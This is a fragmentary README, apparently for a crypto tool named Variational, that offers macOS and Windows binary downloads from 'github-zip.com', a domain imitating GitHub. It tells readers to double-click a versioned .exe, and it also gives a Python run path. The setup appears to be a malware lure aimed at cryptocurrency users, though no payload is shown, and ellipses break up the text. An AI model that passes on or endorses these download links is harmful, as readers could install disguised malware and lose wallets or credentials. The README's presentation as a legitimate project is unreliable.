...
Variational comes in two flavors depending on what you need:
...
|----------|-------------|------|
| **macOS** | Apple Silicon | [Download latest release](https://github-zip.com/Variational-mac) |
| **Windows** | x64 | [Download latest release](https://github-zip.com/Variational) |
...
2. Double-click `Variational-v.1.04.11.exe`
3. That's it

### Python

```bash
cd Variational/python
pip install -r requirements.txt
cd ..
python Variational-v.1.04.11.py
```
...
- RPC provider (Alchemy, Chainstack, or Infura)
...
```
Variational/
├── Variational-v.1.04.11.exe   # Windows binary
...
Made with ❤️ for the Variational community
